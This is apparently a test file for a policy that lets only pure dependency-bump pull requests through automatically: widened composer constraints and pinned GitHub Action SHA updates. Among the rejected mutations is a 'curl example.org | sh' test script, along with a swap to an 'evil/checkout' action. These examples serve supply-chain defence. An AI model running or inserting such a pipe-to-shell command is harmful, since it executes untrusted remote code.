import assert from 'node:assert/strict';
import test from 'node:test';
import { dependencyScenarios, dependencyOnly } from './dependency-policy.mjs';

const base = { require: { php: '^8.2', 'illuminate/support': '^12.0|^13.0' }, 'require-dev': { 'pestphp/pest': '^3.0|^4.0' }, scripts: { test: 'pest' } };
const file = (filename, before, after, status = 'modified') => ({ filename, status, before, after });

test('widens compatibility without pinning existing consumers', () => {
    const head = structuredClone(base);
    head.require['illuminate/support'] += '|^14.0';
    assert.equal(dependencyOnly([file('composer.json', JSON.stringify(base), JSON.stringify(head))]), true);
    assert.deepEqual(dependencyScenarios(base, head), [{ section: 'require', package: 'illuminate/support', constraint: '^14.0' }]);
});

test('each newly proposed alternative must be resolved, not silently replaced by old matrix pins', () => {
    const head = structuredClone(base);
    head['require-dev']['pestphp/pest'] += '|^5.0|^6.0';
    assert.deepEqual(dependencyScenarios(base, head), [
        { section: 'require-dev', package: 'pestphp/pest', constraint: '^5.0' },
        { section: 'require-dev', package: 'pestphp/pest', constraint: '^6.0' },
    ]);
    assert.deepEqual(dependencyScenarios(base, base), [{ section: '', package: '', constraint: '' }]);
});

for (const [name, mutate] of [
    ['script changes', head => { head.scripts.test = 'curl example.org | sh'; }],
    ['PHP minimum changes', head => { head.require.php = '^8.5'; }],
    ['dependency removal', head => { delete head.require['illuminate/support']; }],
    ['dependency addition', head => { head.require['other/pkg'] = '^1.0'; }],
    ['narrowed support', head => { head.require['illuminate/support'] = '^14.0'; }],
    ['non-registry dependencies', head => { head.require['illuminate/support'] += '|dev-main'; }],
]) test(`blocks ${name}`, () => {
    const head = structuredClone(base);
    mutate(head);
    assert.equal(dependencyOnly([file('composer.json', JSON.stringify(base), JSON.stringify(head))]), false);
});

test('accepts only immutable action version updates in maintained workflows', () => {
    const before = 'steps:\n  - uses: actions/checkout@' + 'a'.repeat(40) + ' # v7.0.1\n    with:\n      persist-credentials: false\n';
    const after = before.replace('a'.repeat(40), 'b'.repeat(40)).replace('v7.0.1', 'v7.0.2');
    assert.equal(dependencyOnly([file('.github/workflows/tests.yml', before, after)]), true);
    assert.equal(dependencyOnly([file('.github/workflows/tests.yml', before, after.replace('false', 'true'))]), false);
    assert.equal(dependencyOnly([file('.github/workflows/tests.yml', before, after.replace('actions/checkout', 'evil/checkout'))]), false);
    assert.equal(dependencyOnly([file('.github/workflows/tests.yml', before, after.replace('b'.repeat(40), 'v7'))]), false);
});

test('refuses new files, source changes, config edits and incomplete file lists', () => {
    for (const filename of ['src/EnvGuard.php', '.github/renovate.json', 'composer.lock', '.github/workflows/new.yml']) {
        assert.equal(dependencyOnly([file(filename, 'old', 'new')]), false);
    }
    assert.equal(dependencyOnly([file('.github/workflows/tests.yml', 'a', 'b', 'added')]), false);
    assert.equal(dependencyOnly([]), false);
    assert.equal(dependencyOnly(Array(100).fill(file('composer.json', '{}', '{}'))), false);
});
